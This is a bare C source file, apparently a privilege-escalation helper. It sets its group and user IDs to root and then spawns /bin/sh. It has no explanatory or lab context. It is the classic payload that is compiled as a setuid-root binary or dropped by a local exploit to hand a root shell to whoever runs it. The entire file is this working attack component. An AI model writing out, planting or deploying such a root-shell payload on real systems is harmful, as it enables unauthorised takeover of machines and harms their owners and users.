#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
int main(void) {
	    setgid(0); setuid(0);
		    execl("/bin/sh","sh",0); }
